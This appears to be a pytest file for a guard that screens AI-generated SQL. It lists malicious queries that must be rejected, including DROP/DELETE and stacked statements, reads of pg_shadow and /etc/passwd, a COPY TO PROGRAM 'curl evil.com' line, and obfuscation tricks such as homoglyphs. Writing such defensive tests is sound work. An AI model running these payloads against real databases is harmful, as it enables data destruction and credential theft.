"""
Offline adversarial tests for the AI-search SQL guard (no DB, no LLM).

Covers Adversarial Test Plan §1 (destructive), §2 (exfiltration), §4 (validator bypass),
plus the valid-path + LIMIT enforcement. These must all pass before any LLM-authored SQL runs.
"""
import pytest

from app.services.sql_guard import validate_and_prepare, SqlGuardError

MAX_ROWS = 50

# --- §1 destructive / §2 exfiltration / §4 bypass: every one must be REJECTED ---
MALICIOUS = [
    # §1 destructive
    "DROP TABLE flights",
    "TRUNCATE flights",
    "DELETE FROM flights",
    "UPDATE flights SET airline_name='x'",
    "INSERT INTO flights(flight_id) VALUES ('x')",
    "SELECT 1; DROP TABLE flights",                                   # stacked
    "SELECT 1; DELETE FROM flights; --",                             # stacked + comment
    "WITH x AS (DELETE FROM flights RETURNING 1) SELECT * FROM x",   # writing CTE
    "WITH x AS (UPDATE flights SET airline_name='y' RETURNING 1) SELECT * FROM x",
    "ALTER TABLE flights ADD COLUMN hacked int",
    "GRANT SELECT ON flights TO PUBLIC",
    # §2 exfiltration
    "SELECT * FROM pg_authid",
    "SELECT * FROM pg_shadow",
    "SELECT * FROM ai_usage",
    "SELECT * FROM processed_files",
    "SELECT * FROM information_schema.tables",
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT pg_read_file('/etc/passwd')",
    "COPY flights TO PROGRAM 'curl evil.com'",
    "SELECT current_setting('is_superuser')",
    "SELECT * FROM flights UNION SELECT usename, passwd, NULL FROM pg_shadow",  # union exfil
    "SELECT dblink('host=evil','SELECT 1')",
    # §4 validator bypass
    "DrOp TaBlE flights",                                            # casing
    "SELECT/**/pg_sleep(5)",                                         # comment obfuscation
    "SELECT 1 /* */ ; DROP TABLE flights",                          # comment + stacked
    "SELECT pg_sleep(10) FROM flights",                             # DoS function
    "SELECT * FROM flights f JOIN pg_authid a ON true",            # join to forbidden table
    "DRОP TABLE flights",                                           # cyrillic homoglyph 'О'
]

# --- valid queries: must PASS and come back LIMIT-bounded ---
VALID = [
    "SELECT airline_name, COUNT(*) FROM flights WHERE direction='D' GROUP BY airline_name",
    "SELECT airline_name FROM flights WHERE location_he ILIKE '%לונדון%'",
    "WITH t AS (SELECT airline_name, delay_minutes FROM flights) "
    "SELECT airline_name, AVG(delay_minutes) FROM t GROUP BY airline_name",  # read-only CTE OK
    "SELECT airline_name FROM flights ORDER BY delay_minutes LIMIT 5",       # small limit kept
]


@pytest.mark.parametrize("sql", MALICIOUS)
def test_malicious_sql_rejected(sql):
    with pytest.raises(SqlGuardError):
        validate_and_prepare(sql, MAX_ROWS)


@pytest.mark.parametrize("sql", VALID)
def test_valid_sql_passes_and_is_limited(sql):
    out = validate_and_prepare(sql, MAX_ROWS)
    assert "LIMIT" in out.upper()


def test_missing_limit_is_injected():
    out = validate_and_prepare("SELECT airline_name FROM flights", MAX_ROWS)
    assert out.upper().rstrip().endswith(f"LIMIT {MAX_ROWS}")


def test_oversized_limit_is_clamped():
    out = validate_and_prepare("SELECT airline_name FROM flights LIMIT 999999", MAX_ROWS)
    assert f"LIMIT {MAX_ROWS}" in out.upper()
    assert "999999" not in out


def test_small_limit_is_preserved():
    out = validate_and_prepare("SELECT airline_name FROM flights LIMIT 5", MAX_ROWS)
    assert "LIMIT 5" in out.upper()
